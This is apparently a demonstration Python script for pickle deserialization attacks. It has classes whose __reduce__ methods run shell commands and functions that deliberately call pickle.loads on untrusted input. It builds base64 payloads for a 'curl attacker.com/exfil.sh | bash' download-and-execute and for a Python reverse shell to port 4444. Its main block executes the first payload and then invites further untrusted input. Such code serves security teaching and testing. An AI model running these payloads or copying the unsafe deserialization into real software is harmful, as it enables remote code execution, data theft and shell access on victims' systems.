#!/usr/bin/env python3

import pickle
import os
import subprocess
import base64

class VulnerableClass:
    def __init__(self, name, command=None):
        self.name = name
        self.command = command
    
    def __reduce__(self):
        if self.command:
            return (os.system, (self.command,))
        return (self.__class__, (self.name,))

class MaliciousPayload:
    def __reduce__(self):
        return (subprocess.call, (['whoami'], {'shell': True}))

def deserialize_user_data(serialized_data):
    try:
        user_object = pickle.loads(serialized_data)
        print(f"Deserialized object: {user_object}")
        return user_object
    except Exception as e:
        print(f"Deserialization error: {e}")
        return None

def load_config_from_pickle(config_data):
    try:
        config = pickle.loads(base64.b64decode(config_data))
        
        if hasattr(config, 'settings'):
            for key, value in config.settings.items():
                print(f"Config: {key} = {value}")
        
        return config
    except Exception as e:
        print(f"Config loading error: {e}")
        return None

def process_cache_data(cache_key, cache_data):
    try:
        cached_object = pickle.loads(cache_data)
        
        if hasattr(cached_object, 'process'):
            result = cached_object.process()
            return result
        
        return cached_object
    except Exception as e:
        print(f"Cache processing error: {e}")
        return None

def create_malicious_payload():
    malicious = VulnerableClass("test", "curl attacker.com/exfil.sh | bash")
    
    payload = pickle.dumps(malicious)
    encoded_payload = base64.b64encode(payload).decode('utf-8')
    
    print("Malicious payload created (base64):")
    print(encoded_payload)
    return payload

class RCEExploit:
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        return (os.system, (cmd,))

if __name__ == "__main__":
    print("=== Pickle Deserialization Command Injection Examples ===")
    
    print("\n1. Creating and deserializing malicious object:")
    malicious_payload = create_malicious_payload()
    deserialize_user_data(malicious_payload)
    
    print("\n2. User-provided pickle data:")
    try:
        user_input = input("Enter base64-encoded pickle data (or 'demo' for demo payload): ")
        
        if user_input.lower() == 'demo':
            demo_exploit = RCEExploit()
            demo_payload = pickle.dumps(demo_exploit)
            user_input = base64.b64encode(demo_payload).decode('utf-8')
            print(f"Using demo payload: {user_input[:50]}...")
        
        serialized_data = base64.b64decode(user_input)
        result = deserialize_user_data(serialized_data)
        
    except Exception as e:
        print(f"Input processing error: {e}")
    
    print("\n3. Configuration from pickle:")
    config_input = input("Enter config pickle data (base64): ")
    if config_input:
        load_config_from_pickle(config_input)
    
    print("\n4. Cache data processing:")
    cache_input = input("Enter cache data (raw pickle bytes as string): ")
    if cache_input:
        try:
            cache_bytes = cache_input.encode('latin1')
            process_cache_data("test_key", cache_bytes)
        except Exception as e:
            print(f"Cache input error: {e}")
    
    print("\n=== Attack Payload Examples ===")
    print("1. Simple command execution:")
    simple_exploit = VulnerableClass("exploit", "whoami")
    simple_payload = base64.b64encode(pickle.dumps(simple_exploit)).decode('utf-8')
    print(f"Payload: {simple_payload}")
    
    print("\n2. Reverse shell payload:")
    reverse_shell = RCEExploit()
    shell_payload = base64.b64encode(pickle.dumps(reverse_shell)).decode('utf-8')
    print(f"Payload: {shell_payload[:100]}...")